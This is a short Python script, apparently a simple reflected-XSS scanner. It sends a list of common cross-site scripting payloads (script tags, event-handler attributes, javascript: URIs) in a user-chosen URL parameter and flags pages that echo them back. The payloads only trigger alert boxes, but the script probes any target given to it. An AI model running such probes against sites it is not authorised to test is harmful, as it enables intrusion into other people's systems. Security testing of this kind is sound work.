import requests

# List of common XSS payloads
payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "javascript:alert('XSS')",
    "';alert('XSS');//",
    "<body onload=alert('XSS')>",
    "<a href=javascript:alert('XSS')>Click me</a>"
]

def test_xss(url, param):
    print(f"Testing XSS on {url} with parameter {param}...\n")

    for payload in payloads:
        # Construct the vulnerable URL by injecting payload into the parameter
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url, timeout=5)

            # Check if the payload appears in the response, indicating a potential vulnerability
            if payload in response.text:
                print(f"Potential XSS Vulnerability detected! Payload: {payload}")
                print(f"Response Snippet: {response.text[:200]}\n")
            else:
                print(f"Tested payload: {payload} (No clear signs of XSS)")

        except requests.exceptions.RequestException as e:
            print(f"Error sending request: {e}")
    
    print("\nXSS testing completed.")

# Input the target URL and parameter
target_url = input("Enter the target URL (e.g., http://example.com/search): ")
parameter = input("Enter the vulnerable parameter (e.g., 'q' for http://example.com/search?q=1): ")

# Run XSS tests
test_xss(target_url, parameter)
